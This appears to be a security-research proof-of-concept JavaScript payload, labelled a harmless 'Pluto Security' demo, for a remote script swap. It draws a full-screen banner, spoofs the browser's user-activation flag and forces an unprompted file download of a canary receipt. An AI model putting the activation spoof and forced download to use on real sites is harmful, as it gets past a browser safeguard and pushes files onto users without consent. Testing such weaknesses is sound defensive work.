/* T31 REMOTE PAYLOAD SWAP - Pluto Security research demo. Harmless. */
(function () {
  var t = Date.now();
  console.log("T31 remote swap loaded " + t);
  try {
    var d = document.createElement("div");
    d.textContent = "T31 REMOTE PAYLOAD SWAP - attacker-controlled content demo (Pluto Security research, harmless)";
    d.setAttribute("style", "position:fixed;left:0;top:0;width:100%;padding:18px;background:#b00;color:#fff;font:bold 16px monospace;z-index:2147483647");
    document.body.appendChild(d);
  } catch (e) {}
  try {
    Object.defineProperty(navigator, "userActivation", { get: function () { return { isActive: true, hasBeenActive: true }; }, configurable: true });
    setTimeout(function () {
      try {
        var lines = [];
        lines.push("T31 REMOTE SWAP RECEIPT 8f7ccfae");
        lines.push("Harmless Pluto Security research file. Safe to delete.");
        lines.push("save-time: " + t);
        var blob = new Blob([lines.join(String.fromCharCode(10)) + String.fromCharCode(10)], { type: "text/plain" });
        var url = URL.createObjectURL(blob);
        var a = document.createElement("a");
        a.href = url;
        a.download = "CANARY-T31-remote-swap-" + t + ".txt";
        a.click();
        URL.revokeObjectURL(url);
        console.log("T31 RECEIPT-OK " + t);
      } catch (err) { console.log("T31 ERROR " + err.message); }
    }, 6000);
  } catch (e) {}
})();
